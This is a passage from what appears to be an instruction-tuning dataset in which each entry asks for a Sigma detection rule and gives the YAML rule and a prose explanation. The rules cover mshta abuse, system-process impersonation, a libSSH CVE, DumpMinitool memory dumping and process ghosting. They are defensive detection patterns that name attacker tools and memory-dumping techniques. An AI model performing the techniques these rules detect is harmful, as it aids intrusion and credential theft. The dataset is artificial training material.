    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mshta.exe'\n        - OriginalFileName: 'MSHTA.EXE'\n    selection_susp:\n        # Suspicious parents\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\wscript.exe'\n        # Suspicious folders\n        CommandLine|contains:\n            - '\\AppData\\Local\\'\n            - 'C:\\ProgramData\\'\n            - 'C:\\Users\\Public\\'\n            - 'C:\\Windows\\Temp\\'\n    filter_img:\n        # Filter legit Locations\n        - Image|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n        # Suspicious extensions\n        - CommandLine|contains:\n            - '.htm'\n            - '.hta'\n        # Filter simple execution\n        - CommandLine|endswith:\n            - 'mshta.exe'\n            - 'mshta'\n    condition: all of selection_* or (selection_img and not filter_img)\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\mshta.exe'\n        - OriginalFileName: 'MSHTA.EXE'\n    selection_susp:\n        # Suspicious parents\n        ParentImage|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\wscript.exe'\n        # Suspicious folders\n        CommandLine|contains:\n            - '\\AppData\\Local\\'\n            - 'C:\\ProgramData\\'\n            - 'C:\\Users\\Public\\'\n            - 'C:\\Windows\\Temp\\'\n    filter_img:\n        # Filter legit Locations\n        - Image|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n        # Suspicious extensions\n        - CommandLine|contains:\n            - '.htm'\n            - '.hta'\n        # Filter simple execution\n        - CommandLine|endswith:\n            - 'mshta.exe'\n            - 'mshta'\n    condition: all of selection_* or (selection_img and not filter_img)\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious mshta process execution patterns",
      "answer": "In order to detect suspicious mshta process execution patterns, you should monitor process creation events on Windows systems for specific conditions indicating potential misuse of the Microsoft HTML Application Host (mshta.exe). Focus on activities where the process image ends with '\\mshta.exe' or the original filename is identified exactly as 'MSHTA.EXE'. It's essential to scrutinize instances where this process is initiated by parent processes commonly abused in attacks, such as 'cmd.exe', 'cscript.exe', 'powershell.exe', 'pwsh.exe', 'regsvr32.exe', 'rundll32.exe', and 'wscript.exe'. These parent processes raise the alarm about possible script or command execution attacks aiming to bypass security measures.\n\nAdditionally, pay attention to commands that involve suspicious directories like '\\AppData\\Local\\', 'C:\\ProgramData\\', 'C:\\Users\\Public\\', and 'C:\\Windows\\Temp\\'. These locations are frequently used by attackers to execute malicious scripts or drop malware due to less stringent permissions or to evade detection. Furthermore, filter out legitimate execution paths from 'C:\\Windows\\System32\\' and 'C:\\Windows\\SysWOW64\\' to reduce false positives, while also being vigilant for command lines containing file extensions '.htm' and '.hta' that are typically associated with HTML applications and scripts, excluding those that simply end with 'mshta.exe' or 'mshta' to avoid catching regular program executions.\n\nThe condition for raising an alert is met if all the specified criteria in selections for suspicious parent processes or folders are observed or if there's an execution of 'mshta.exe' that doesn't fit the filtered-out legitimate use cases. The detection of such patterns is critical given the high risk associated with the tactics and techniques employed that may include execution, persistence, privilege escalation, defense evasion, among others, linked with the abuse of mshta.exe in the context of an attack."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of an executable with a system process name in folders other than the system ones (System32, SysWOW64...etc)..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of an executable with a system process name in folders other than the system ones (System32, SysWOW64, etc.), you should monitor file events on Windows systems. Specifically, look for occurrences where the targeted file name ends with names commonly associated with critical Windows processes, such as 'AtBroker.exe', 'audiodg.exe', 'cmd.exe', 'powershell.exe', and many others, suggesting that an executable is impersonating a system process.\n\nPay special attention to the creation of these executables in locations that do not start with standard system paths like 'C:\\Windows\\System32\\', 'C:\\Windows\\SysWOW64\\', 'C:\\Windows\\WinSxS\\', 'C:\\Windows\\SoftwareDistribution\\', and '\\SystemRoot\\System32\\'. Moreover, certain conditions like files starting with 'C:\\$WINDOWS.~BT\\' and specific image paths such as 'C:\\$WINDOWS.~BT\\Sources\\SetupHost.exe' or 'C:\\Windows\\system32\\wbengine.exe' associated with 'RuntimeBroker.exe' should raise flags. Additional scrutiny is advised for files created under 'C:\\Windows\\SoftwareDistribution\\Download\\' by 'svchost.exe', and any activity involving 'C:\\Program Files\\WindowsApps\\' as well as operations performed by 'wuauclt.exe', 'explorer.exe', and 'msiexec.exe' in unexpected directories.\n\nExclude from your alerts any instance where these files are part of legitimate actions, such as system processes copied for testing outside their default directories or third-party software naming their applications similarly to system processes. Due to the close match between these executable names and vital system components, activities flagged by this monitoring approach are typically treated with a high level of suspicion.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|endswith:\n            - '\\AtBroker.exe'\n            - '\\audiodg.exe'\n            - '\\backgroundTaskHost.exe'\n            - '\\bcdedit.exe'\n            - '\\bitsadmin.exe'\n            - '\\cmdl32.exe'\n            - '\\cmstp.exe'\n            - '\\conhost.exe'\n            - '\\csrss.exe'\n            - '\\dasHost.exe'\n            - '\\dfrgui.exe'\n            - '\\dllhost.exe'\n            - '\\dwm.exe'\n            - '\\eventcreate.exe'\n            - '\\eventvwr.exe'\n            - '\\explorer.exe'\n            - '\\extrac32.exe'\n            - '\\fontdrvhost.exe'\n            - '\\ipconfig.exe'\n            - '\\iscsicli.exe'\n            - '\\iscsicpl.exe'\n            - '\\logman.exe'\n            - '\\LogonUI.exe'\n            - '\\LsaIso.exe'\n            - '\\lsass.exe'\n            - '\\lsm.exe'\n            - '\\msiexec.exe'\n            - '\\msinfo32.exe'\n            - '\\mstsc.exe'\n            - '\\nbtstat.exe'\n            - '\\odbcconf.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regini.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\RuntimeBroker.exe'\n            - '\\schtasks.exe'\n            - '\\SearchFilterHost.exe'\n            - '\\SearchIndexer.exe'\n            - '\\SearchProtocolHost.exe'\n            - '\\SecurityHealthService.exe'\n            - '\\SecurityHealthSystray.exe'\n            - '\\services.exe'\n            - '\\ShellAppRuntime.exe'\n            - '\\sihost.exe'\n            - '\\smartscreen.exe'\n            - '\\smss.exe'\n            - '\\spoolsv.exe'\n            - '\\svchost.exe'\n            - '\\SystemSettingsBroker.exe'\n            - '\\taskhost.exe'\n            - '\\taskhostw.exe'\n            - '\\Taskmgr.exe'\n            - '\\TiWorker.exe'\n            - '\\vssadmin.exe'\n            - '\\w32tm.exe'\n            - '\\WerFault.exe'\n            - '\\WerFaultSecure.exe'\n            - '\\wermgr.exe'\n            - '\\wevtutil.exe'\n            - '\\wininit.exe'\n            - '\\winlogon.exe'\n            - '\\winrshost.exe'\n            - '\\WinRTNetMUAHostServer.exe'\n            - '\\wlanext.exe'\n            - '\\wlrmdr.exe'\n            - '\\WmiPrvSE.exe'\n            - '\\wslhost.exe'\n            - '\\WSReset.exe'\n            - '\\WUDFHost.exe'\n            - '\\WWAHost.exe'\n    filter1:\n        TargetFilename|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n            - 'C:\\Windows\\WinSxS\\'\n            - 'C:\\Windows\\SoftwareDistribution\\'\n            - '\\SystemRoot\\System32\\'\n        Image|endswith:\n            - '\\Windows\\System32\\dism.exe'\n            - '\\TiWorker.exe'\n    filter2:\n        TargetFilename|startswith: 'C:\\$WINDOWS.~BT\\'\n        Image: 'C:\\$WINDOWS.~BT\\Sources\\SetupHost.exe'\n    filter3:\n        TargetFilename|endswith: '\\RuntimeBroker.exe'\n        Image: 'C:\\Windows\\system32\\wbengine.exe'\n    filter4:\n        Image|endswith: ':\\Windows\\system32\\svchost.exe'\n        TargetFilename|startswith: 'C:\\Windows\\SoftwareDistribution\\Download\\'\n        TargetFilename|endswith:\n            - '\\spoolsv.exe'\n            - '\\bcdedit.exe'\n    filter5:\n        Image|endswith: ':\\Windows\\system32\\svchost.exe'\n        TargetFilename|startswith: 'C:Program Files\\WindowsApps\\'\n    filter6:\n        Image: C:\\Windows\\System32\\wuauclt.exe\n    filter7:\n        TargetFilename: 'C:\\Windows\\explorer.exe'\n    filter8:\n        # This filter handles system processes who are updated/installed using misexec.\n        Image: C:\\WINDOWS\\system32\\msiexec.exe\n        # Add more processes if you find them or simply filter msiexec on its own. If the list grows big\n        TargetFilename: C:\\Program Files\\PowerShell\\7\\pwsh.exe\n    filter_healtray:\n        TargetFilename|startswith: 'C:\\Windows\\System32\\SecurityHealth\\'\n        TargetFilename|endswith: '\\SecurityHealthSystray.exe'\n        Image|endswith: '\\SecurityHealthSetup.exe'\n    condition: selection and not 1 of filter*\nfields:\n    - Image\nfalsepositives:\n    - System processes copied outside their default folders for testing purposes\n    - Third party software naming their software with the same names as the processes mentioned here\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|endswith:\n            - '\\AtBroker.exe'\n            - '\\audiodg.exe'\n            - '\\backgroundTaskHost.exe'\n            - '\\bcdedit.exe'\n            - '\\bitsadmin.exe'\n            - '\\cmdl32.exe'\n            - '\\cmstp.exe'\n            - '\\conhost.exe'\n            - '\\csrss.exe'\n            - '\\dasHost.exe'\n            - '\\dfrgui.exe'\n            - '\\dllhost.exe'\n            - '\\dwm.exe'\n            - '\\eventcreate.exe'\n            - '\\eventvwr.exe'\n            - '\\explorer.exe'\n            - '\\extrac32.exe'\n            - '\\fontdrvhost.exe'\n            - '\\ipconfig.exe'\n            - '\\iscsicli.exe'\n            - '\\iscsicpl.exe'\n            - '\\logman.exe'\n            - '\\LogonUI.exe'\n            - '\\LsaIso.exe'\n            - '\\lsass.exe'\n            - '\\lsm.exe'\n            - '\\msiexec.exe'\n            - '\\msinfo32.exe'\n            - '\\mstsc.exe'\n            - '\\nbtstat.exe'\n            - '\\odbcconf.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regini.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\RuntimeBroker.exe'\n            - '\\schtasks.exe'\n            - '\\SearchFilterHost.exe'\n            - '\\SearchIndexer.exe'\n            - '\\SearchProtocolHost.exe'\n            - '\\SecurityHealthService.exe'\n            - '\\SecurityHealthSystray.exe'\n            - '\\services.exe'\n            - '\\ShellAppRuntime.exe'\n            - '\\sihost.exe'\n            - '\\smartscreen.exe'\n            - '\\smss.exe'\n            - '\\spoolsv.exe'\n            - '\\svchost.exe'\n            - '\\SystemSettingsBroker.exe'\n            - '\\taskhost.exe'\n            - '\\taskhostw.exe'\n            - '\\Taskmgr.exe'\n            - '\\TiWorker.exe'\n            - '\\vssadmin.exe'\n            - '\\w32tm.exe'\n            - '\\WerFault.exe'\n            - '\\WerFaultSecure.exe'\n            - '\\wermgr.exe'\n            - '\\wevtutil.exe'\n            - '\\wininit.exe'\n            - '\\winlogon.exe'\n            - '\\winrshost.exe'\n            - '\\WinRTNetMUAHostServer.exe'\n            - '\\wlanext.exe'\n            - '\\wlrmdr.exe'\n            - '\\WmiPrvSE.exe'\n            - '\\wslhost.exe'\n            - '\\WSReset.exe'\n            - '\\WUDFHost.exe'\n            - '\\WWAHost.exe'\n    filter1:\n        TargetFilename|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n            - 'C:\\Windows\\WinSxS\\'\n            - 'C:\\Windows\\SoftwareDistribution\\'\n            - '\\SystemRoot\\System32\\'\n        Image|endswith:\n            - '\\Windows\\System32\\dism.exe'\n            - '\\TiWorker.exe'\n    filter2:\n        TargetFilename|startswith: 'C:\\$WINDOWS.~BT\\'\n        Image: 'C:\\$WINDOWS.~BT\\Sources\\SetupHost.exe'\n    filter3:\n        TargetFilename|endswith: '\\RuntimeBroker.exe'\n        Image: 'C:\\Windows\\system32\\wbengine.exe'\n    filter4:\n        Image|endswith: ':\\Windows\\system32\\svchost.exe'\n        TargetFilename|startswith: 'C:\\Windows\\SoftwareDistribution\\Download\\'\n        TargetFilename|endswith:\n            - '\\spoolsv.exe'\n            - '\\bcdedit.exe'\n    filter5:\n        Image|endswith: ':\\Windows\\system32\\svchost.exe'\n        TargetFilename|startswith: 'C:Program Files\\WindowsApps\\'\n    filter6:\n        Image: C:\\Windows\\System32\\wuauclt.exe\n    filter7:\n        TargetFilename: 'C:\\Windows\\explorer.exe'\n    filter8:\n        # This filter handles system processes who are updated/installed using misexec.\n        Image: C:\\WINDOWS\\system32\\msiexec.exe\n        # Add more processes if you find them or simply filter msiexec on its own. If the list grows big\n        TargetFilename: C:\\Program Files\\PowerShell\\7\\pwsh.exe\n    filter_healtray:\n        TargetFilename|startswith: 'C:\\Windows\\System32\\SecurityHealth\\'\n        TargetFilename|endswith: '\\SecurityHealthSystray.exe'\n        Image|endswith: '\\SecurityHealthSetup.exe'\n    condition: selection and not 1 of filter*\nfields:\n    - Image\nfalsepositives:\n    - System processes copied outside their default folders for testing purposes\n    - Third party software naming their software with the same names as the processes mentioned here\nlevel: high\n",
      "question": "creation of an executable with a system process name in folders other than the system ones (System32, SysWOW64...etc).",
      "answer": "In order to detect the creation of an executable with a system process name in folders other than the system ones (System32, SysWOW64, etc.), you should monitor file events on Windows systems. Specifically, look for occurrences where the targeted file name ends with names commonly associated with critical Windows processes, such as 'AtBroker.exe', 'audiodg.exe', 'cmd.exe', 'powershell.exe', and many others, suggesting that an executable is impersonating a system process.\n\nPay special attention to the creation of these executables in locations that do not start with standard system paths like 'C:\\Windows\\System32\\', 'C:\\Windows\\SysWOW64\\', 'C:\\Windows\\WinSxS\\', 'C:\\Windows\\SoftwareDistribution\\', and '\\SystemRoot\\System32\\'. Moreover, certain conditions like files starting with 'C:\\$WINDOWS.~BT\\' and specific image paths such as 'C:\\$WINDOWS.~BT\\Sources\\SetupHost.exe' or 'C:\\Windows\\system32\\wbengine.exe' associated with 'RuntimeBroker.exe' should raise flags. Additional scrutiny is advised for files created under 'C:\\Windows\\SoftwareDistribution\\Download\\' by 'svchost.exe', and any activity involving 'C:\\Program Files\\WindowsApps\\' as well as operations performed by 'wuauclt.exe', 'explorer.exe', and 'msiexec.exe' in unexpected directories.\n\nExclude from your alerts any instance where these files are part of legitimate actions, such as system processes copied for testing outside their default directories or third-party software naming their applications similarly to system processes. Due to the close match between these executable names and vital system components, activities flagged by this monitoring approach are typically treated with a high level of suspicion."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential exploitation attempt of CVE-2023-2283 an authentication bypass in libSSH. The exploitation method causes an error message stating that keys for curve25519 could not be generated. It is an error message that is a sign of an exploitation attempt. It is not a sign of a successful exploitation..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential exploitation attempt of CVE-2023-2283, an authentication bypass in libSSH, you should: focus on monitoring sshd logs on Linux systems for error messages specifically stating that \"Failed to generate curve25519 keys\". This error message can be indicative of an exploitation attempt against the vulnerability in libSSH related to curve25519 key generation. It's important to note, however, that this indication does not confirm a successful exploit but rather an attempt. Be aware that similar error messages can also arise from legitimate errors in the initialization or generation of the X25519 elliptic curve keys, which are considered false positives in this context. The associated risk with this activity is deemed medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: sshd\ndetection:\n    keywords:\n        - 'Failed to generate curve25519 keys'\n    condition: keywords\nfalsepositives:\n    - Errors with the initialization or generation of the X25519 elliptic curve keys may generate the same error message\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: sshd\ndetection:\n    keywords:\n        - 'Failed to generate curve25519 keys'\n    condition: keywords\nfalsepositives:\n    - Errors with the initialization or generation of the X25519 elliptic curve keys may generate the same error message\nlevel: medium\n",
      "question": "potential exploitation attempt of CVE-2023-2283 an authentication bypass in libSSH. The exploitation method causes an error message stating that keys for curve25519 could not be generated. It is an error message that is a sign of an exploitation attempt. It is not a sign of a successful exploitation.",
      "answer": "In order to detect potential exploitation attempt of CVE-2023-2283, an authentication bypass in libSSH, you should: focus on monitoring sshd logs on Linux systems for error messages specifically stating that \"Failed to generate curve25519 keys\". This error message can be indicative of an exploitation attempt against the vulnerability in libSSH related to curve25519 key generation. It's important to note, however, that this indication does not confirm a successful exploit but rather an attempt. Be aware that similar error messages can also arise from legitimate errors in the initialization or generation of the X25519 elliptic curve keys, which are considered false positives in this context. The associated risk with this activity is deemed medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting use of \"DumpMinitool.exe\" a tool that allows the dump of process memory via the use of the \"MiniDumpWriteDump\".\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of \"DumpMinitool.exe\", a tool that allows the dumping of process memory via the use of the \"MiniDumpWriteDump\", you should: Monitor Windows process creation logs for occurrences where processes are started with names ending in '\\DumpMinitool.exe', '\\DumpMinitool.x86.exe', or '\\DumpMinitool.arm64.exe'. Additionally, watch for instances where the OriginalFileName attribute matches 'DumpMinitool.exe', 'DumpMinitool.x86.exe', or 'DumpMinitool.arm64.exe'. It is also crucial to check if the processes were initiated with command line arguments containing ' Full', ' Mini', or ' WithHeap', as these are indicative of attempts to dump process memory using specific features of the tool. All these criteria need to be met for a definitive detection. Be aware that there might be unknown false positives and this detection has been rated at a medium level of confidence.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\DumpMinitool.exe'\n            - '\\DumpMinitool.x86.exe'\n            - '\\DumpMinitool.arm64.exe'\n        - OriginalFileName:\n            - 'DumpMinitool.exe'\n            - 'DumpMinitool.x86.exe'\n            - 'DumpMinitool.arm64.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' Full'\n            - ' Mini'\n            - ' WithHeap'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\DumpMinitool.exe'\n            - '\\DumpMinitool.x86.exe'\n            - '\\DumpMinitool.arm64.exe'\n        - OriginalFileName:\n            - 'DumpMinitool.exe'\n            - 'DumpMinitool.x86.exe'\n            - 'DumpMinitool.arm64.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' Full'\n            - ' Mini'\n            - ' WithHeap'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "use of \"DumpMinitool.exe\" a tool that allows the dump of process memory via the use of the \"MiniDumpWriteDump\"",
      "answer": "In order to detect the use of \"DumpMinitool.exe\", a tool that allows the dumping of process memory via the use of the \"MiniDumpWriteDump\", you should: Monitor Windows process creation logs for occurrences where processes are started with names ending in '\\DumpMinitool.exe', '\\DumpMinitool.x86.exe', or '\\DumpMinitool.arm64.exe'. Additionally, watch for instances where the OriginalFileName attribute matches 'DumpMinitool.exe', 'DumpMinitool.x86.exe', or 'DumpMinitool.arm64.exe'. It is also crucial to check if the processes were initiated with command line arguments containing ' Full', ' Mini', or ' WithHeap', as these are indicative of attempts to dump process memory using specific features of the tool. All these criteria need to be met for a definitive detection. Be aware that there might be unknown false positives and this detection has been rated at a medium level of confidence."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet, you should: Monitor Windows PowerShell script activities, specifically looking out for scripts that include both 'Unblock-File ' and '-Path ' commands in the script block text. These indicators suggest that a script is attempting to remove the mark of a file being downloaded from the internet, an action commonly associated with bypassing security measures. Ensure that Script Block Logging is enabled on the system to capture the necessary data. Be aware that legitimate PowerShell scripts might also perform similar actions, so it's important to differentiate between benign usage and potential security threats. The security level for this type of detection is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Unblock-File '\n            - '-Path '\n    condition: selection\nfalsepositives:\n    - Legitimate PowerShell scripts\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - 'Unblock-File '\n            - '-Path '\n    condition: selection\nfalsepositives:\n    - Legitimate PowerShell scripts\nlevel: medium\n",
      "question": "Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.",
      "answer": "In order to remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet, you should: Monitor Windows PowerShell script activities, specifically looking out for scripts that include both 'Unblock-File ' and '-Path ' commands in the script block text. These indicators suggest that a script is attempting to remove the mark of a file being downloaded from the internet, an action commonly associated with bypassing security measures. Ensure that Script Block Logging is enabled on the system to capture the necessary data. Be aware that legitimate PowerShell scripts might also perform similar actions, so it's important to differentiate between benign usage and potential security threats. The security level for this type of detection is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Checks whether the image specified in a process creation event is not a full, absolute path (caused by process ghosting or other unorthodox methods to start a process).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to check whether the image specified in a process creation event is not a full, absolute path (caused by process ghosting or other unorthodox methods to start a process), you should: Monitor the process creation logs on Windows systems for occurrences where the path of the executed image does not contain a backslash ('\\'), implying it's not a full path. Additionally, disregard any events where the 'Image' field is null, empty, or contains a hyphen, which are indicative of normal or non-suspicious activities. Specific system processes such as System, Registry, MemCompression, and vmmem, along with their command lines, should also be excluded from the detection criteria due to their routine nature and low likelihood of being exploited in this context. This approach is aimed at identifying potentially malicious activities where attackers may employ techniques like process ghosting to execute their payloads without using a standard filesystem path, thereby evading certain types of detection mechanisms. The criteria for a match require that none of the filtered conditions apply, thus highlighting cases with high suspicion and reducing the chances of false positives, although some unknown false positives may still occur. This monitoring is set at a high level of importance due to the severity of the attack tactic it seeks to uncover.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    image_absolute_path:\n        Image|contains: '\\'\n    filter_null:\n        Image: null\n    filter_empty:\n        Image:\n            - '-'\n            - ''\n    filter_4688:\n        - Image:\n            - 'System'\n            - 'Registry'\n            - 'MemCompression'\n            - 'vmmem'\n        - CommandLine:\n            - 'Registry'\n            - 'MemCompression'\n            - 'vmmem'\n    condition: not image_absolute_path and not 1 of filter*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    image_absolute_path:\n        Image|contains: '\\'\n    filter_null:\n        Image: null\n    filter_empty:\n        Image:\n            - '-'\n            - ''\n    filter_4688:\n        - Image:\n            - 'System'\n            - 'Registry'\n            - 'MemCompression'\n            - 'vmmem'\n        - CommandLine:\n            - 'Registry'\n            - 'MemCompression'\n            - 'vmmem'\n    condition: not image_absolute_path and not 1 of filter*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Checks whether the image specified in a process creation event is not a full, absolute path (caused by process ghosting or other unorthodox methods to start a process)",
      "answer": "In order to check whether the image specified in a process creation event is not a full, absolute path (caused by process ghosting or other unorthodox methods to start a process), you should: Monitor the process creation logs on Windows systems for occurrences where the path of the executed image does not contain a backslash ('\\'), implying it's not a full path. Additionally, disregard any events where the 'Image' field is null, empty, or contains a hyphen, which are indicative of normal or non-suspicious activities. Specific system processes such as System, Registry, MemCompression, and vmmem, along with their command lines, should also be excluded from the detection criteria due to their routine nature and low likelihood of being exploited in this context. This approach is aimed at identifying potentially malicious activities where attackers may employ techniques like process ghosting to execute their payloads without using a standard filesystem path, thereby evading certain types of detection mechanisms. The criteria for a match require that none of the filtered conditions apply, thus highlighting cases with high suspicion and reducing the chances of false positives, although some unknown false positives may still occur. This monitoring is set at a high level of importance due to the severity of the attack tactic it seeks to uncover."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of powershell scripts via Runscripthelper.exe.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of PowerShell scripts via Runscripthelper.exe, you should monitor for process creation events on Windows systems that involve the execution of the Runscripthelper.exe file. Specifically, look for occurrences where the process's name ends with '\\Runscripthelper.exe' and the command line includes the string 'surfacecheck'. This activity indicates that a PowerShell script may be executed in a manner that could be malicious or unauthorized. You should capture the command line arguments involved in these events to provide context for further analysis. Be aware that there may be instances where this detection could trigger on legitimate activities, although such cases are not immediately known. The severity level for this type of detection is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\Runscripthelper.exe'\n        CommandLine|contains: 'surfacecheck'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\Runscripthelper.exe'\n        CommandLine|contains: 'surfacecheck'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "execution of powershell scripts via Runscripthelper.exe",
      "answer": "In order to detect the execution of PowerShell scripts via Runscripthelper.exe, you should monitor for process creation events on Windows systems that involve the execution of the Runscripthelper.exe file. Specifically, look for occurrences where the process's name ends with '\\Runscripthelper.exe' and the command line includes the string 'surfacecheck'. This activity indicates that a PowerShell script may be executed in a manner that could be malicious or unauthorized. You should capture the command line arguments involved in these events to provide context for further analysis. Be aware that there may be instances where this detection could trigger on legitimate activities, although such cases are not immediately known. The severity level for this type of detection is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting WMI command line event consumers.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect WMI command line event consumers, you should: Monitor for specific images being loaded in the Windows operating system, particularly focusing on the image loading events related to \"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\". Additionally, pay close attention to instances where 'wbemcons.dll' is loaded by any process, indicated by the ending of the loaded image path. This behavior can point towards the execution or utilization of Windows Management Instrumentation (WMI) for potentially malicious purposes, often associated with surveillance or automation of tasks that could be leveraged by an attacker. Be aware, however, that due to the novelty and complexity of this detection method, there might be unknown false positives, indicating a necessity for further data analysis and testing. The associated threat level with this type of detection is classified as high, reflecting the malicious potential of abusing WMI components.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe'\n        ImageLoaded|endswith: '\\wbemcons.dll'\n    condition: selection\nfalsepositives:\n    - Unknown (data set is too small; further testing needed)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe'\n        ImageLoaded|endswith: '\\wbemcons.dll'\n    condition: selection\nfalsepositives:\n    - Unknown (data set is too small; further testing needed)\nlevel: high\n",
      "question": "WMI command line event consumers",
      "answer": "In order to detect WMI command line event consumers, you should: Monitor for specific images being loaded in the Windows operating system, particularly focusing on the image loading events related to \"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\". Additionally, pay close attention to instances where 'wbemcons.dll' is loaded by any process, indicated by the ending of the loaded image path. This behavior can point towards the execution or utilization of Windows Management Instrumentation (WMI) for potentially malicious purposes, often associated with surveillance or automation of tasks that could be leveraged by an attacker. Be aware, however, that due to the novelty and complexity of this detection method, there might be unknown false positives, indicating a necessity for further data analysis and testing. The associated threat level with this type of detection is classified as high, reflecting the malicious potential of abusing WMI components."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exceptions in velocity template renderer, this most likely happens due to dynamic rendering of user input and may lead to RCE..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exceptions in velocity template renderer, this most likely happens due to dynamic rendering of user input and may lead to Remote Code Execution (RCE), you should: Focus on monitoring application error logs specifically within applications that use the velocity template rendering engine. Ensure that these logs have a log level of ERROR or above as specified in the requirements. Detection can be achieved by looking out for specific exception keywords that indicate a problematic state during the rendering process. These keywords include 'ParseErrorException', 'VelocityException', and 'TemplateInitException'. It is essential to monitor for these exceptions because they indicate that something went wrong during the dynamic rendering of user input, which might be an attempt at or indicative of a possible RCE attack. Be aware that there could be certain situations where these alerts might not signify an actual attack but rather stem from internal application bugs or issues like missing '.vm' 